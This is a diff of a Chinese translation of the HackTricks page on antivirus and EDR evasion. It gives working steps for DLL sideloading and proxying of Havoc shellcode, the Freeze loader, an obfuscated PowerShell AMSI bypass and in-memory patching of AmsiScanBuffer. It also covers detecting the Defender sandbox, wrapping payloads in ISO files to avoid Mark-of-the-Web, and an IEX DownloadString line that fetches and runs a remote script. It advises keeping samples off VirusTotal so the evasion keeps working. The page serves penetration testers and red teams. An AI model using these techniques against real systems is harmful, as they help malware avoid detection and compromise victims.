@@ -1,85 +1,86 @@
-# 绕过杀毒软件（AV）
+# 杀毒软件 (AV) 绕过
 
 <details>
 
 <summary><a href="https://cloud.hacktricks.xyz/pentesting-cloud/pentesting-cloud-methodology"><strong>☁️ HackTricks Cloud ☁️</strong></a> -<a href="https://twitter.com/hacktricks_live"><strong>🐦 Twitter 🐦</strong></a> - <a href="https://www.twitch.tv/hacktricks_live/schedule"><strong>🎙️ Twitch 🎙️</strong></a> - <a href="https://www.youtube.com/@hacktricks_LIVE"><strong>🎥 Youtube 🎥</strong></a></summary>
 
-* 你在一家**网络安全公司**工作吗？你想在HackTricks中看到你的**公司广告**吗？或者你想获得**PEASS的最新版本或下载PDF格式的HackTricks**吗？请查看[**订阅计划**](https://github.com/sponsors/carlospolop)！
-* 发现我们的独家[**NFTs**](https://opensea.io/collection/the-peass-family)收藏品——[**The PEASS Family**](https://opensea.io/collection/the-peass-family)
-* 获取[**官方PEASS和HackTricks周边产品**](https://peass.creator-spring.com)
-* **加入**[**💬**](https://emojipedia.org/speech-balloon/) [**Discord群组**](https://discord.gg/hRep4RUj7f) 或 [**Telegram群组**](https://t.me/peass) 或 **关注**我在**Twitter**上的[**🐦**](https://github.com/carlospolop/hacktricks/tree/7af18b62b3bdc423e11444677a6a73d4043511e9/\[https:/emojipedia.org/bird/README.md)[**@carlospolopm**](https://twitter.com/hacktricks\_live)**。**
-* **通过向**[**hacktricks repo**](https://github.com/carlospolop/hacktricks) **和**[**hacktricks-cloud repo**](https://github.com/carlospolop/hacktricks-cloud) **提交PR来分享你的黑客技巧。**
+* 如果您在**网络安全公司**工作，想在**HackTricks**上看到您的**公司广告**，或者想要获取**PEASS最新版本或下载HackTricks的PDF**？请查看[**订阅计划**](https://github.com/sponsors/carlospolop)！
+* 发现[**PEASS家族**](https://opensea.io/collection/the-peass-family)，我们独家的[**NFTs**](https://opensea.io/collection/the-peass-family)系列。
+* 获取[**官方PEASS & HackTricks周边产品**](https://peass.creator-spring.com)。
+* **加入**[**💬**](https://emojipedia.org/speech-balloon/) [**Discord群组**](https://discord.gg/hRep4RUj7f)或[**telegram群组**](https://t.me/peass)或在**Twitter**上**关注**我[**🐦**](https://github.com/carlospolop/hacktricks/tree/7af18b62b3bdc423e11444677a6a73d4043511e9/\[https:/emojipedia.org/bird/README.md)[**@carlospolopm**](https://twitter.com/hacktricks\_live)**。**
+* **通过向**[**hacktricks仓库**](https://github.com/carlospolop/hacktricks) **和** [**hacktricks-cloud仓库**](https://github.com/carlospolop/hacktricks-cloud) **提交PR来分享您的黑客技巧。**
 
 </details>
 
-**本页由**[**@m2rc\_p**](https://twitter.com/m2rc\_p)**编写！**
+**本页面由** [**@m2rc\_p**](https://twitter.com/m2rc\_p)**编写！**
 
-## **绕过杀毒软件（AV）方法论**
+## **AV 绕过方法论**
 
-目前，杀毒软件使用不同的方法来检查文件是否恶意，包括静态检测、动态分析，以及更高级的EDR行为分析。
+目前，AV使用不同的方法来检查文件是否恶意，包括静态检测、动态分析，以及更高级的EDR，还有行为分析。
 
 ### **静态检测**
 
-静态检测通过在二进制文件或脚本中标记已知的恶意字符串或字节数组，并从文件本身提取信息（例如文件描述、公司名称、数字签名、图标、校验和等）来实现。这意味着使用已知的公共工具可能更容易被发现，因为它们可能已经被分析并标记为恶意。有几种方法可以绕过这种类型的检测：
+静态检测是通过标记二进制文件或脚本中已知的恶意字符串或字节序列，以及从文件本身提取信息（例如文件描述、公司名称、数字签名、图标、校验和等）来实现的。这意味着使用已知的公共工具可能会更容易被捕获，因为它们可能已经被分析并标记为恶意。有几种方法可以绕过这种检测：
 
 * **加密**
 
-如果你加密了二进制文件，杀毒软件将无法检测到你的程序，但你需要一种加载器来解密并在内存中运行程序。
+如果您加密了二进制文件，AV将无法检测到您的程序，但您需要某种加载器来解密并在内存中运行程序。
 
 * **混淆**
 
-有时，你只需要改变二进制文件或脚本中的一些字符串，就可以通过杀毒软件。但这可能是一项耗时的任务，取决于你要混淆的内容。
+有时您只需要更改二进制文件或脚本中的一些字符串就可以绕过AV，但这可能是一个耗时的任务，这取决于您尝试混淆的内容。
 
 * **自定义工具**
 
-如果你开发自己的工具，就不会有已知的恶意签名，但这需要很多时间和精力。
+如果您开发自己的工具，将没有已知的恶意签名，但这需要大量的时间和努力。
 
 {% hint style="info" %}
-检查Windows Defender静态检测的一个好方法是使用[ThreatCheck](https://github.com/rasta-mouse/ThreatCheck)。它将文件分成多个段，然后要求Defender分别扫描每个段，这样，它可以告诉你在你的二进制文件中有哪些被标记的字符串或字节。
+检查Windows Defender静态检测的一个好方法是使用[ThreatCheck](https://github.com/rasta-mouse/ThreatCheck)。它基本上将文件分成多个段，然后让Defender逐个扫描，这样就可以准确地告诉您二进制文件中哪些字符串或字节被标记了。
 {% endhint %}
 
-我强烈推荐你查看这个关于实际AV绕过的[YouTube播放列表](https://www.youtube.com/playlist?list=PLj05gPj8rk\_pkb12mDe4PgYZ5qPxhGKGf)。
+我强烈推荐您查看这个关于实用AV绕过的[YouTube播放列表](https://www.youtube.com/playlist?list=PLj05gPj8rk\_pkb12mDe4PgYZ5qPxhGKGf)。
 
 ### **动态分析**
 
-动态分析是指杀毒软件在沙箱中运行你的二进制文件，并监视恶意活动（例如尝试解密和读取浏览器密码、对LSASS进行minidump等）。这部分可能会更加棘手，但以下是一些可以用来逃避沙箱的方法。
+动态分析是指AV在沙箱中运行您的二进制文件并监视恶意活动（例如尝试解密并读取您的浏览器密码，对LSASS执行minidump等）。这部分可能更难处理，但这里有一些方法可以绕过沙箱。
 
-* **执行前休眠** 根据实现方式的不同，这可能是绕过杀毒软件动态分析的好方法。杀毒软件在扫描文件时有很短的时间，以不中断用户的工作流程，因此使用较长的休眠时间可能会干扰对二进制文件的分析。问题是，许多杀毒软件的沙箱可以根据实现方式跳过休眠。
-* **检查机器资源** 通常，沙箱的资源非常有限（例如，<2GB RAM），否则它们可能会减慢用户的机器。在这里，你也可以非常有创意，例如通过检查CPU的温度甚至风扇转速，不是所有的东西都会在沙箱中实现。
-* **特定机器的检查** 如果你想针对一个工作站加入到"contoso.local"域的用户进行攻击，你可以检查计算机的域是否与你指定的域匹配，如果不匹配，你可以让你的程序退出。
+* **执行前休眠** 根据实现方式的不同，这可能是绕过AV动态分析的好方法。AV在扫描文件时有非常短的时间，以免打扰用户的工作流程，因此使用长时间的休眠可以干扰二进制文件的分析。问题是，许多AV的沙箱可以根据实现方式跳过休眠。
+* **检查机器资源** 通常沙箱的资源非常有限（例如 < 2GB RAM），否则可能会减慢用户机器的速度。在这里，您也可以非常有创意，例如通过检查CPU的温度甚至风扇速度，沙箱中不会实现所有内容。
+* **机器特定检查** 如果您想针对加入了"contoso.local"域的用户的工作站，您可以检查计算机的域名是否与您指定的匹配，如果不匹配，您可以使程序退出。
 
-事实证明，Microsoft Defender的沙箱计算机名是HAL9TH，所以，在引爆之前，你可以在恶意软件中检查计算机名，如果名称与HAL9TH匹配，这意味着你在Defender的沙箱中，所以你可以让你的程序退出。
+事实证明，Microsoft Defender的沙箱计算机名是HAL9TH，所以，您可以在恶意软件引爆前检查计算机名，如果名字匹配HAL9TH，意味着您在defender的沙箱内，您可以使程序退出。
 
 <figure><img src="../.gitbook/assets/image (3) (6).png" alt=""><figcaption><p>来源：<a href="https://youtu.be/StSLxFbVz0M?t=1439">https://youtu.be/StSLxFbVz0M?t=1439</a></p></figcaption></figure>
 
-[@mgeeky](https://twitter.com/mariuszbit)在对抗沙箱方面提供了一些其他非常好的建议。
+[@mgeeky](https://twitter.com/mariuszbit)提供了一些非常好的对抗沙箱的技巧
 
-<figure><img src="../.gitbook/assets/image (2) (1) (1) (2) (1).png" alt=""><figcaption><p><a href="https://discord.com/servers/red-team-vx-community-1012733841229746240">Red Team VX Discord</a> #malware-dev channel</p></figcaption></figure>
+<figure><img src="../.gitbook/assets/image (2) (1) (1) (2) (1).png" alt=""><figcaption><p><a href="https://discord.com/servers/red-team-vx-community-1012733841229746240">Red Team VX Discord</a> #malware-dev 频道</p></figcaption></figure>
 
-正如我们在本文中之前所说，**公共工具**最终会被**检测到**，所以，你应该问自己一个问题：
+正如我们之前在这篇文章中所说，**公共工具**最终会**被检测到**，所以，您应该问自己一个问题：
 
-例如，如果你想转储LSASS，**你真的需要使用mimikatz吗**？或者你可以使用一个不太知名但也可以转储LSASS的不同项目。
+例如，如果您想要dump LSASS，**您真的需要使用mimikatz吗**？或者您可以使用一个不太知名但也可以dump LSASS的不同项目。
 
-正确的答案可能是后者。以mimikatz为例，它可能是被杀毒软件和EDR标记为恶意软件的最多的一个，虽然这个项目本身非常酷，但要绕过杀毒软件，它也是一个噩梦，所以只需寻找你想要实现的目标的替代方案。
+正确的答案可能是后者。以mimikatz为例，它可能是AV和EDR最多标记的恶意软件之一，虽然该项目本身非常酷，但要绕过AV也是一场噩梦，所以只需寻找您想要实现的替代方案。
 
 {% hint style="info" %}
-在修改你的有效载荷以进行绕过时，请确保在Defender中**关闭自动样本提交**，并且，请认真对待，请**不要将其上传到VIRUSTOTAL**，如果你的目标是长期实现绕过。如果你想检查你的有效载荷是否被特定杀毒软件检测到，请在虚拟机上安装它，尝试关闭自动样本提交，并在那里进行测试，直到你对结果满意为止。
+在修改您的有效载荷以实现逃避时，请确保**关闭defender中的自动样本提交**，并且请认真地，**不要上传到VIRUSTOTAL**，如果您的目标是长期实现逃避。如果您想检查您的有效载荷是否被特定的AV检测到，请在VM上安装它，尝试关闭自动样本提交，并在那里测试，直到您对结果满意为止。
 {% endhint %}
-## EXEs vs DLLs
 
-每当可能的时候，始终优先使用DLL来进行逃避。根据我的经验，DLL文件通常被检测和分析的可能性要小得多，因此这是一个非常简单的技巧，可以在某些情况下避免被检测（当然，如果你的有效负载有一种以DLL方式运行的方法）。
+## EXEs 与 DLLs
 
-正如我们在这张图片中所看到的，Havoc的DLL有效负载在antiscan.me上的检测率为4/26，而EXE有效负载的检测率为7/26。
+只要有可能，总是**优先使用DLLs进行逃避**，根据我的经验，DLL文件通常**检测率更低**，分析也少，所以这是一个非常简单的技巧，可以在某些情况下避免检测（当然，如果您的有效载荷有某种方式可以作为DLL运行）。
 
-<figure><img src="../.gitbook/assets/image (6) (3) (1).png" alt=""><figcaption><p>antiscan.me对比普通Havoc EXE有效负载和普通Havoc DLL有效负载</p></figcaption></figure>
+正如我们在这张图片中看到的，Havoc的DLL有效载荷在antiscan.me上的检测率为4/26，而EXE有效载荷的检测率为7/26。
 
-现在我们将展示一些你可以使用DLL文件的技巧，以使你的行动更加隐蔽。
+<figure><img src="../.gitbook/assets/image (6) (3) (1).png" alt=""><figcaption><p>antiscan.me对比正常Havoc EXE有效载荷与正常Havoc DLL</p></figcaption></figure>
 
-## DLL侧载和代理
+现在我们将展示一些您可以使用DLL文件来更加隐秘的技巧。
 
-**DLL侧载**利用加载器使用的DLL搜索顺序，将受害者应用程序和恶意有效负载放在一起。
+## DLL 侧加载 & 代理
 
-你可以使用[Siofra](https://github.com/Cybereason/siofra)和以下PowerShell脚本来检查易受DLL侧载攻击的程序：
+**DLL侧加载**利用加载器使用的DLL搜索顺序，通过将受害应用程序和恶意有效载荷放置在彼此旁边来实现。
+
+您可以使用[Siofra](https://github.com/Cybereason/siofra)和以下powershell脚本检查易受DLL侧加载影响的程序：
 
 {% code overflow="wrap" %}
 ```powershell
@@ -90,13 +91,13 @@ C:\Users\user\Desktop\Siofra64.exe --mode file-scan --enum-dependency --dll-hija
 ```
 {% endcode %}
 
-这个命令将输出在"C:\Program Files\\"目录下易受DLL劫持攻击的程序列表以及它们尝试加载的DLL文件。
+此命令将输出"C:\Program Files\\"中可能受DLL劫持的程序列表及其尝试加载的DLL文件。
 
-我强烈建议你自己**探索可劫持/侧载的DLL程序**，如果正确使用，这种技术非常隐蔽，但如果你使用公开已知的DLL侧载程序，你可能很容易被发现。
+我强烈建议你**自己探索可DLL劫持/侧载的程序**，如果操作得当，这种技术相当隐蔽，但如果你使用公开已知的可DLL侧载的程序，你可能很容易被发现。
 
-仅仅通过将一个恶意DLL文件放置在程序期望加载的名称下，并不能加载你的载荷，因为程序期望在该DLL文件中有一些特定的函数。为了解决这个问题，我们将使用另一种技术，称为**DLL代理/转发**。
+仅仅放置一个恶意DLL并命名为程序期望加载的名称，并不会加载你的有效载荷，因为程序期望该DLL内有一些特定的函数，为了解决这个问题，我们将使用另一种技术称为**DLL代理/转发**。
 
-**DLL代理**将程序从代理（恶意）DLL中发出的调用转发到原始DLL，从而保留程序的功能并能够处理你的载荷的执行。
+**DLL代理**将程序从代理（和恶意）DLL所做的调用转发到原始DLL，从而保留了程序的功能性，并能够处理你的有效载荷的执行。
 
 我将使用[@flangvik](https://twitter.com/Flangvik/)的[SharpDLLProxy](https://github.com/Flangvik/SharpDllProxy)项目。
 
@@ -109,35 +110,33 @@ C:\Users\user\Desktop\Siofra64.exe --mode file-scan --enum-dependency --dll-hija
 3. (Optional) Encode your shellcode using Shikata Ga Nai (https://github.com/EgeBalci/sgn)
 4. Use SharpDLLProxy to create the proxy dll (.\SharpDllProxy.exe --dll .\mimeTools.dll --payload .\demon.bin)
 ```
-{% endcode %}
-
-最后一个命令将给我们两个文件：一个DLL源代码模板和原始重命名的DLL。
+```markdown
+最后一个命令将给我们两个文件：一个DLL源代码模板和重命名后的原始DLL。
 
 <figure><img src="../.gitbook/assets/sharpdllproxy.gif" alt=""><figcaption></figcaption></figure>
-
-{% code overflow="wrap" %}
+```
 ```
 5. Create a new visual studio project (C++ DLL), paste the code generated by SharpDLLProxy (Under output_dllname/dllname_pragma.c) and compile. Now you should have a proxy dll which will load the shellcode you've specified and also forward any calls to the original DLL.
 ```
 {% endcode %}
 
-以下是结果：
+这些是结果：
 
 <figure><img src="../.gitbook/assets/dll_sideloading_demo.gif" alt=""><figcaption></figcaption></figure>
 
-我们的shellcode（使用[SGN](https://github.com/EgeBalci/sgn)编码）和代理DLL在[antiscan.me](https://antiscan.me)上都有0/26的检测率！我认为这是一个成功。
+我们的 shellcode（使用 [SGN](https://github.com/EgeBalci/sgn) 编码）和代理 DLL 在 [antiscan.me](https://antiscan.me) 上的检测率为 0/26！我会说这是一个成功。
 
 <figure><img src="../.gitbook/assets/image (11) (3).png" alt=""><figcaption></figcaption></figure>
 
 {% hint style="info" %}
-我**强烈建议**您观看[S3cur3Th1sSh1t的twitch VOD](https://www.twitch.tv/videos/1644171543)关于DLL Sideloading的内容，还有[ippsec的视频](https://www.youtube.com/watch?v=3eROsG\_WNpE)，以更深入地了解我们讨论的内容。
+我**强烈推荐**你观看 [S3cur3Th1sSh1t 的 twitch VOD](https://www.twitch.tv/videos/1644171543) 关于 DLL Sideloading 的内容，以及 [ippsec 的视频](https://www.youtube.com/watch?v=3eROsG\_WNpE) 来更深入地了解我们讨论的内容。
 {% endhint %}
 
 ## [**Freeze**](https://github.com/optiv/Freeze)
 
-`Freeze是一个使用挂起进程、直接系统调用和替代执行方法绕过EDR的有效载荷工具包`
+`Freeze 是一个用于绕过 EDR 的 payload 工具包，它使用挂起进程、直接系统调用和替代执行方法`
 
-您可以使用Freeze以隐蔽的方式加载和执行您的shellcode。
+你可以使用 Freeze 来以隐蔽的方式加载和执行你的 shellcode。
 ```
 Git clone the Freeze repo and build it (git clone https://github.com/optiv/Freeze.git && cd Freeze && go build Freeze.go)
 1. Generate some shellcode, in this case I used Havoc C2.
@@ -147,46 +146,46 @@ Git clone the Freeze repo and build it (git clone https://github.com/optiv/Freez
 <figure><img src="../.gitbook/assets/freeze_demo_hacktricks.gif" alt=""><figcaption></figcaption></figure>
 
 {% hint style="info" %}
-逃避只是一场猫和老鼠的游戏，今天有效的方法明天可能被检测到，所以不要仅依赖一个工具，如果可能的话，尝试链接多个逃避技术。
+规避就是一场猫鼠游戏，今天有效的方法明天可能就会被检测到，因此不要只依赖一个工具，如果可能的话，尝试结合多种规避技术。
 {% endhint %}
 
 ## AMSI（反恶意软件扫描接口）
 
-AMSI是为了防止“[无文件恶意软件](https://en.wikipedia.org/wiki/Fileless\_malware)”而创建的。最初，杀毒软件只能扫描**磁盘上的文件**，因此，如果你能够以某种方式**直接在内存中执行**有效载荷，杀毒软件无法阻止它，因为它没有足够的可见性。
+AMSI 被创建来防止“[无文件恶意软件](https://en.wikipedia.org/wiki/Fileless\_malware)”。最初，杀毒软件只能扫描**磁盘上的文件**，所以如果你能以某种方式**直接在内存中执行有效载荷**，杀毒软件就无能为力了，因为它没有足够的可见性。
 
-AMSI功能集成在Windows的以下组件中。
+AMSI 功能集成在 Windows 的以下组件中。
 
-* 用户帐户控制（UAC）（提升EXE、COM、MSI或ActiveX安装）
-* PowerShell（脚本、交互使用和动态代码评估）
-* Windows脚本宿主（wscript.exe和cscript.exe）
-* JavaScript和VBScript
-* Office VBA宏
+* 用户账户控制，或 UAC（EXE、COM、MSI 或 ActiveX 安装的提升）
+* PowerShell（脚本、交互式使用和动态代码评估）
+* Windows 脚本宿主（wscript.exe 和 cscript.exe）
+* JavaScript 和 VBScript
+* Office VBA 宏
 
-它允许杀毒软件解析脚本行为，通过以未加密和未混淆的形式公开脚本内容。
+它允许杀毒解决方案通过暴露脚本内容的方式来检查脚本行为，这种形式既未加密也未混淆。
 
-运行`IEX (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/master/Recon/PowerView.ps1')`将在Windows Defender上产生以下警报。
+运行 `IEX (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/master/Recon/PowerView.ps1')` 将在 Windows Defender 上产生以下警报。
 
 <figure><img src="../.gitbook/assets/image (4) (5).png" alt=""><figcaption></figcaption></figure>
 
-注意它是如何在路径之前添加`amsi:`，然后是脚本运行的可执行文件的路径，本例中是powershell.exe。
+注意它是如何在路径前添加 `amsi:`，然后是从中运行脚本的可执行文件的路径，在这个例子中是 powershell.exe
 
-我们没有将任何文件写入磁盘，但由于AMSI的存在，我们仍然在内存中被捕获。
+我们没有将任何文件放到磁盘上，但仍然因为 AMSI 而在内存中被捕获。
 
-有几种方法可以绕过AMSI：
+有几种方法可以绕过 AMSI：
 
 * **混淆**
 
-由于AMSI主要用于静态检测，因此修改要加载的脚本可以是一种逃避检测的好方法。
+由于 AMSI 主要是靠静态检测工作，因此，修改你尝试加载的脚本可能是一种规避检测的好方法。
 
-然而，即使脚本有多个层次，AMSI也有解混淆脚本的能力，因此，根据操作方式，混淆可能不是一个好选择。这使得逃避变得不那么直接。尽管如此，有时你只需要更改几个变量名就可以了，所以这取决于某个东西被标记了多少次。
+然而，AMSI 有能力即使是多层混淆的脚本也能解混淆，所以混淆可能是一个不好的选择，这取决于它是如何完成的。这使得规避并不那么直截了当。尽管如此，有时候，你只需要更改几个变量名就可以了，所以这取决于某件事情被标记的程度。
 
-* **AMSI绕过**
+* **AMSI 绕过**
 
-由于AMSI是通过将DLL加载到powershell（也包括cscript.exe、wscript.exe等）进程中来实现的，即使作为非特权用户也可以轻松篡改它。由于AMSI实现中的这个缺陷，研究人员已经找到了多种逃避AMSI扫描的方法。
+由于 AMSI 是通过将 DLL 加载到 powershell（也包括 cscript.exe、wscript.exe 等）进程中来实现的，即使作为非特权用户也可以轻松篡改它。由于 AMSI 实现中的这个缺陷，研究人员发现了多种绕过 AMSI 扫描的方法。
 
 **强制错误**
 
-强制AMSI初始化失败（amsiInitFailed）将导致当前进程不会启动扫描。最初，这是由[马特·格雷伯](https://twitter.com/mattifestation)披露的，微软已经开发了一个签名来防止更广泛的使用。
+强制 AMSI 初始化失败（amsiInitFailed）将导致不会为当前进程启动扫描。最初这是由 [Matt Graeber](https://twitter.com/mattifestation) 披露的，微软已经开发了一个签名来防止更广泛的使用。
 
 {% code overflow="wrap" %}
 ```powershell
@@ -194,9 +193,9 @@ AMSI功能集成在Windows的以下组件中。
 ```
 {% endcode %}
 
-只需要一行PowerShell代码就可以使当前的PowerShell进程无法使用AMSI。当然，这行代码已经被AMSI本身标记了，所以需要进行一些修改才能使用这个技术。
+只需一行powershell代码，就可以使AMSI对当前powershell进程失效。当然，这行代码已经被AMSI标记，因此需要进行一些修改才能使用这种技术。
 
-下面是我从这个[Github Gist](https://gist.github.com/r00t-3xp10it/a0c6a368769eec3d3255d4814802b5db)中获取的修改后的AMSI绕过技术。
+这是我从这个[Github Gist](https://gist.github.com/r00t-3xp10it/a0c6a368769eec3d3255d4814802b5db)中获取的修改后的AMSI绕过方法。
 ```powershell
 Try{#Ams1 bypass technic nº 2
 $Xdatabase = 'Utils';$Homedrive = 'si'
@@ -210,53 +209,57 @@ $Spotfix = $SDcleanup.GetField($Rawdata,"$ComponentDeviceId,Static")
 $Spotfix.SetValue($null,$true)
 }Catch{Throw $_}
 ```
-**内存篡改**
+请记住，一旦这篇文章发布，这种做法很可能会被标记，所以如果你的计划是保持不被发现，你不应该发布任何代码。
 
-这种技术最初是由[@RastaMouse](https://twitter.com/_RastaMouse/)发现的，它涉及到在amsi.dll中找到"AmsiScanBuffer"函数的地址（负责扫描用户提供的输入），并用返回E_INVALIDARG代码的指令覆盖它，这样，实际扫描的结果将返回0，被解释为干净的结果。
+**内存打补丁**
+
+这项技术最初是由[@RastaMouse](https://twitter.com/_RastaMouse/) 发现的，它涉及到找到 amsi.dll（负责扫描用户提供的输入）中 "AmsiScanBuffer" 函数的地址，并将其覆盖为返回 E_INVALIDARG 代码的指令，这样，实际扫描的结果将返回 0，这被解释为干净的结果。
 
 {% hint style="info" %}
-请阅读[https://rastamouse.me/memory-patching-amsi-bypass/](https://rastamouse.me/memory-patching-amsi-bypass/)以获取更详细的解释。
+请阅读 [https://rastamouse.me/memory-patching-amsi-bypass/](https://rastamouse.me/memory-patching-amsi-bypass/) 以获取更详细的解释。
 {% endhint %}
 
-还有许多其他用于绕过PowerShell的AMSI的技术，请查看[**此页面**](basic-powershell-for-pentesters/#amsi-bypass)和[此存储库](https://github.com/S3cur3Th1sSh1t/Amsi-Bypass-Powershell)以了解更多信息。
+还有许多其他技术可以用来绕过 AMSI 和 powershell，查看[**这个页面**](basic-powershell-for-pentesters/#amsi-bypass) 和 [这个仓库](https://github.com/S3cur3Th1sSh1t/Amsi-Bypass-Powershell) 来了解更多关于它们的信息。
+
+或者这个脚本通过内存打补丁将为每个新的 Powersh 打补丁
 
 ## 混淆
 
-有几种工具可以用于**混淆C#明文代码**，生成**元编程模板**以编译二进制文件或**混淆已编译的二进制文件**，例如：
+有几种工具可以用来**混淆 C# 明文代码**，生成**元编程模板**来编译二进制文件或**混淆已编译的二进制文件**，例如：
 
-* [**InvisibilityCloak**](https://github.com/h4wkst3r/InvisibilityCloak)**：C#混淆器**
-* [**Obfuscator-LLVM**](https://github.com/obfuscator-llvm/obfuscator)：该项目的目标是提供LLVM编译套件的开源分支，通过[代码混淆](http://en.wikipedia.org/wiki/Obfuscation_(software))和防篡改来提高软件安全性。
-* [**ADVobfuscator**](https://github.com/andrivet/ADVobfuscator)：ADVobfuscator演示了如何使用`C++11/14`语言在编译时生成混淆代码，而不使用任何外部工具并且不修改编译器。
-* [**obfy**](https://github.com/fritzone/obfy)：通过C++模板元编程框架生成一层混淆操作，使想要破解应用程序的人的生活变得更加困难。
-* [**Alcatraz**](https://github.com/weak1337/Alcatraz)**：**Alcatraz是一个能够混淆各种不同的PE文件（包括：.exe、.dll、.sys）的x64二进制混淆器。
-* [**metame**](https://github.com/a0rtega/metame)：Metame是一个用于任意可执行文件的简单变形代码引擎。
-* [**ropfuscator**](https://github.com/ropfuscator/ropfuscator)：ROPfuscator是一个基于LLVM支持的语言的精细级代码混淆框架，使用ROP（返回导向编程）将程序从汇编代码级别转换为ROP链，破坏了我们对正常控制流的自然概念。
-* [**Nimcrypt**](https://github.com/icyguider/nimcrypt)：Nimcrypt是一个用Nim编写的.NET PE加密器。
-* [**inceptor**](https://github.com/klezVirus/inceptor)**：**Inceptor能够将现有的EXE/DLL转换为shellcode，然后加载它们。
+* [**InvisibilityCloak**](https://github.com/h4wkst3r/InvisibilityCloak)**：C# 混淆器**
+* [**Obfuscator-LLVM**](https://github.com/obfuscator-llvm/obfuscator): 该项目的目标是提供一个开源的 [LLVM](http://www.llvm.org/) 编译套件分支，能够通过[代码混淆](http://en.wikipedia.org/wiki/Obfuscation_(software))和防篡改提高软件安全性。
+* [**ADVobfuscator**](https://github.com/andrivet/ADVobfuscator): ADVobfuscator 展示了如何使用 `C++11/14` 语言在编译时生成混淆代码，而无需使用任何外部工具，也无需修改编译器。
+* [**obfy**](https://github.com/fritzone/obfy): 添加由 C++ 模板元编程框架生成的混淆操作层，这将使想要破解应用程序的人的生活变得更加困难。
+* [**Alcatraz**](https://github.com/weak1337/Alcatraz)**:** Alcatraz 是一个 x64 二进制混淆器，能够混淆各种不同的 pe 文件，包括：.exe、.dll、.sys
+* [**metame**](https://github.com/a0rtega/metame): Metame 是一个简单的变形代码引擎，适用于任意可执行文件。
+* [**ropfuscator**](https://github.com/ropfuscator/ropfuscator): ROPfuscator 是一个用于 LLVM 支持的语言的细粒度代码混淆框架，使用 ROP（返回导向编程）。ROPfuscator 通过将常规指令转换为 ROP 链来混淆程序，从而挫败我们对正常控制流的自然概念。
+* [**Nimcrypt**](https://github.com/icyguider/nimcrypt): Nimcrypt 是用 Nim 编写的 .NET PE 加密器
+* [**inceptor**](https://github.com/klezVirus/inceptor)**:** Inceptor 能够将现有的 EXE/DLL 转换为 shellcode，然后加载它们
 
-## SmartScreen和MoTW
+## SmartScreen 和 MoTW
 
-你可能在从互联网下载并执行某些可执行文件时看到了这个屏幕。
+当你从互联网下载某些可执行文件并执行它们时，你可能见过这个屏幕。
 
-Microsoft Defender SmartScreen是一种安全机制，旨在保护最终用户免受运行潜在恶意应用程序的影响。
+Microsoft Defender SmartScreen 是一种旨在保护最终用户免受可能恶意应用程序运行的安全机制。
 
 <figure><img src="../.gitbook/assets/image (1) (4).png" alt=""><figcaption></figcaption></figure>
 
-SmartScreen主要采用基于声誉的方法，意味着不常下载的应用程序将触发SmartScreen，从而警示并阻止最终用户执行该文件（尽管仍然可以通过点击更多信息->仍然运行来执行该文件）。
+SmartScreen 主要采用基于信誉的方法，这意味着不常下载的应用程序将触发 SmartScreen，从而提醒并阻止最终用户执行文件（尽管通过点击 More Info -> Run anyway 仍然可以执行文件）。
 
-**MoTW**（Mark of The Web）是一个带有Zone.Identifier名称的[NTFS备用数据流](https://en.wikipedia.org/wiki/NTFS#Alternate_data_stream_(ADS))，在从互联网下载文件时会自动创建，以及它被下载的URL。
+**MoTW**（网络标记）是一个名为 Zone.Identifier 的 [NTFS 备用数据流](https://en.wikipedia.org/wiki/NTFS#Alternate_data_stream_(ADS))，在从互联网下载文件时自动创建，同时记录了下载它的 URL。
 
-<figure><img src="../.gitbook/assets/image (13) (3).png" alt=""><figcaption><p>检查从互联网下载的文件的Zone.Identifier ADS。</p></figcaption></figure>
+<figure><img src="../.gitbook/assets/image (13) (3).png" alt=""><figcaption><p>检查从互联网下载的文件的 Zone.Identifier ADS。</p></figcaption></figure>
 
 {% hint style="info" %}
-重要的是要注意，使用**受信任的**签名证书签名的可执行文件**不会触发SmartScreen**。
+重要的是要注意，用**可信**签名证书签名的可执行文件**不会触发 SmartScreen**。
 {% endhint %}
 
-防止你的载荷获得Mark of The Web的一种非常有效的方法是将它们打包到某种容器中，比如ISO。这是因为Mark-of-the-Web（MOTW）**无法**应用于**非NTFS**卷。
+防止你的有效载荷获得网络标记的一个非常有效的方法是将它们打包到某种容器中，如 ISO。这是因为网络标记（MOTW）**不能**应用于**非 NTFS**卷。
 
 <figure><img src="../.gitbook/assets/image (12) (2) (2).png" alt=""><figcaption></figcaption></figure>
 
-[**PackMyPayload**](https://github.com/mgeeky/PackMyPayload/)是一个将载荷打包到输出容器以规避Mark-of-the-Web的工具。
+[**PackMyPayload**](https://github.com/mgeeky/PackMyPayload/) 是一个将有效载荷打包到输出容器中以规避网络标记的工具。
 
 示例用法：
 ```powershell
@@ -280,117 +283,96 @@ Adding file: /TotallyLegitApp.exe
 
 [+] Generated file written to (size: 3420160): container.iso
 ```
-以下是使用[PackMyPayload](https://github.com/mgeeky/PackMyPayload/)将有效负载封装在ISO文件中绕过SmartScreen的演示。
+以下是使用 [PackMyPayload](https://github.com/mgeeky/PackMyPayload/) 将有效载荷打包到 ISO 文件中以绕过 SmartScreen 的演示
 
 <figure><img src="../.gitbook/assets/packmypayload_demo.gif" alt=""><figcaption></figcaption></figure>
 
-## C#程序集反射
+## C# 程序集反射
 
-将C#二进制文件加载到内存中已经有一段时间了，这仍然是一种非常好的方法，可以在不被杀毒软件发现的情况下运行后渗透工具。
+在内存中加载 C# 二进制文件已经被知晓一段时间，它仍然是一个非常好的方法，可以在不被 AV 发现的情况下运行你的后渗透工具。
 
-由于有效负载将直接加载到内存中而不接触磁盘，我们只需要担心如何为整个进程打补丁以绕过AMSI。
+由于有效载荷将直接加载到内存中而不触及磁盘，我们只需要担心整个过程中修补 AMSI。
 
-大多数C2框架（如sliver、Covenant、metasploit、CobaltStrike、Havoc等）已经提供了直接在内存中执行C#程序集的能力，但有不同的方法：
+大多数 C2 框架（sliver、Covenant、metasploit、CobaltStrike、Havoc 等）已经提供了直接在内存中执行 C# 程序集的能力，但执行方式有所不同：
 
-* **分叉和运行**
+* **Fork\&Run**
 
-它涉及**生成一个新的牺牲进程**，将你的后渗透恶意代码注入到该新进程中，执行你的恶意代码，完成后杀死新进程。这种方法既有好处，也有缺点。分叉和运行方法的好处是执行发生在我们的Beacon植入进程**之外**。这意味着如果我们的后渗透操作出现问题或被发现，我们的植入物**有更大的机会存活下来**。缺点是你有更大的机会被**行为检测**发现。
